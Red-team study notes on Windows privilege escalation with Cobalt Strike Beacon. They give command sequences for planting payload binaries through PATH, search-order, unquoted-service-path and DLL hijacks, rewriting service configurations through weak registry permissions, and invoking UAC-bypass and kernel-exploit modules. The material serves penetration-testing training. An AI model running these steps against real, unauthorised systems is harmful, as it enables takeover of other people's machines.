
Privilege escalation is what turns _access_ into _control_.

Most real-world initial access lands you as a **standard user**. Thatâ€™s expected. Windows is designed that way. Privilege escalation (MITRE **TA0004**) is about abusing **design assumptions**, **misconfigurations**, or **vulnerabilities** to gain **more authority than intended**.

ğŸ§  **Red team reality**  

> Lateral movement, credential dumping, and persistence often **require elevation first**.


### ğŸ‘¤ Windows Account Types (Know Your Target)

Understanding _who you are_ is step zero.

#### Account Types at a Glance

| Account Type             | Privilege Level                      | Key Notes                |
| ------------------------ | ------------------------------------ | ------------------------ |
| **User**                 | Low                                  | Limited to own files     |
| **Administrator**        | High (when elevated)                 | Full control _after_ UAC |
| **LocalService**         | Low local, anonymous network         | Service context          |
| **NetworkService**       | Low local, computer creds on network | Common service abuse     |
| **LocalSystem (SYSTEM)** | Highest                              | More powerful than Admin |

ğŸ§  Service accounts **do not appear in `net user`**  their power comes from **User Rights Assignments**, not group membership.

Quick check in Beacon:

- `whoami /priv` (shows enabled privs, look for SeImpersonate, SeBackup, SeRestore, SeTakeOwnership).
- `whoami /groups` (confirms medium integrity even if admin group member).

### ğŸ” User Rights Assignments - Silent Power

Windows grants privileges via **User Rights Assignments**, split into two groups:

#### Logon Rights

Control _how_ an account can log in.

Example:

- `SeBatchLogonRight` â†’ Task Scheduler logons
#### User Rights

Override object permissions entirely.

Example:

- `SeBackupPrivilege` â†’ Read _any_ file
- `SeImpersonatePrivilege` â†’ Impersonate SYSTEM âš ï¸
    
ğŸ§  **Critical insight**  

> Many web servers, SQL services, and app pools run with **SeImpersonatePrivilege** - a classic SYSTEM escalation path.


### ğŸ” Enumerating Services


Services often run as SYSTEM but can be misconfigured. Use `sc_enum` in Beacon (BOF) for quick dump.

```
beacon> sc_enum
```

Key fields to inspect:

- `SERVICE_START_NAME` â†’ SYSTEM?
- `BINARY_PATH_NAME` â†’ Quoted? Writable? (where the exe lives.)
- `START_TYPE` â†’ Auto-start = better

### ğŸ›£ï¸ PATH Environment Variable Hijacking

Windows searches `PATH` to locate executables.

```
beacon> env
```

PATH is built from:

- **Machine PATH** (HKLM) âŒ not writable by users
- **User PATH** (HKCU) âœ… writable

#### Why This Breaks Security

If a **machine-level PATH directory** is writable by users and appears **before System32**, attackers win.

```
beacon> cacls C:\Python313\Scripts
```

If `Authenticated Users` have **Write**, drop a malicious binary:

```
beacon> cd C:\Python313\Scripts
beacon> upload dns_x64.exe
beacon> mv dns_x64.exe timeout.exe
```

ğŸ§  Any code calling `timeout` now runs _your_ binary as SYSTEM.


### ğŸ”„ Search Order Hijacking 

Not all execution follows PATH rules.

#### Common Search Order (WinExec-style)

1. Executing directory
2. Current working directory
3. System32
4. Windows
5. PATH

Services usually start in `C:\Windows\System32`, which is why **cmd.exe PATH hijacks often fail**.

#### Fix: Hijack the Executing Directory

```
beacon> cacls "C:\Program Files\Bad Windows Service\Service Executable"
```

```
C:\Python313\Scripts\ BUILTIN\Administrators:(CI)(OI)F
                      NT AUTHORITY\SYSTEM:(CI)(OI)F
                      BUILTIN\Users:(CI)(OI)R
                      NT AUTHORITY\Authenticated Users:C
                      NT AUTHORITY\Authenticated Users:(CI)(OI)(IO)(special access:)
                                                                   DELETE
                                                                   GENERIC_READ
                                                                   GENERIC_WRITE
                                                                   GENERIC_EXECUTE
```

  

The key for this output is as follows:  

- F: Full
- R: Read & execute
- C: Read, write, execute, & delete
- W: Write

`NT AUTHORITY\Authenticated Users:C` --> So we can Write 

If writable:

```
beacon> upload dns_x64.exe
beacon> mv dns_x64.exe cmd.exe
```


### â— Unquoted Service Paths

If a service path contains **spaces** and **no quotes**, Windows guesses.

Example:

```
C:\Program Files\Bad Windows Service\Service Executable\BadWindowsService.exe
```

Windows tries:

```
C:\Program.exe
C:\Program Files\Bad.exe
C:\Program Files\Bad Windows Service\Service.exe
```

If _any_ of those are writable â†’ escalation.

```
beacon> upload dns_x64.svc.exe
beacon> mv dns_x64.svc.exe Service.exe
```

Restart required:

```
beacon> sc_stop BadWindowsService
beacon> sc_start BadWindowsService
```

ğŸ§  Use **svc.exe payloads** for service abuse.


### ğŸ§¬ Weak Service Registry Permissions 

Service configs live here:

```
HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>
```

Check ACLs:

```
beacon> powerpick Get-Acl HKLM:\SYSTEM\CurrentControlSet\Services\BadWindowsService | fl
```

If writable:

```
beacon> sc_config BadWindowsService C:\Payload.exe 0 2
```

ğŸ§  Cleaner than overwriting binaries.


### ğŸ§± DLL Search Order Hijacking 

Applications load DLLs **by name**, not full path.

### Typical Search Order

1. Executing directory
2. System32
3. Windows
4. PATH
    
If a writable directory appears early â†’ drop malicious DLL.

```
beacon> cd C:\Program Files\Bad Windows Service\Service Executable
beacon> upload dns_x64.dll
beacon> mv dns_x64.dll BadDll.dll
```

- Why works: Service reloads DLL on start/restart.
- Extra: Use reflective DLLs or CS's dll payload. Tools like SharpUp auto-find these.

### ğŸ›— Elevators vs Exploits (Cobalt Strike)

Admins run medium integrity by default - UAC prompts for high-integrity actions.
#### `elevate` - Spawn SYSTEM Beacon

```
beacon> elevate
```

| Exploit                      | Description        |
| ---------------------------- | ------------------ |
| `svc-exe`                    | SYSTEM via service |
| `uac-schtasks`               | SilentCleanup      |
| `uac-token-duplication`      | Token abuse        |
| `ms14-058`, `ms15-051`, etc. | Kernel exploits    |

#### `runasadmin` - Run Command as Admin

```
beacon> runasadmin
```

| Elevator       | Technique    |
| -------------- | ------------ |
| `uac-eventvwr` | Event Viewer |
| `uac-cmstplua` | COM abuse    |
| `uac-wscript`  | Script host  |
| `ms16-032`     | Handle abuse |

ğŸ§  `runasadmin` is flexible - you choose the command.


## ğŸ¯ Final Thought

Privilege escalation isnâ€™t about â€œgetting SYSTEM fastâ€.

Itâ€™s about **choosing the least noisy path that survives scrutiny**.

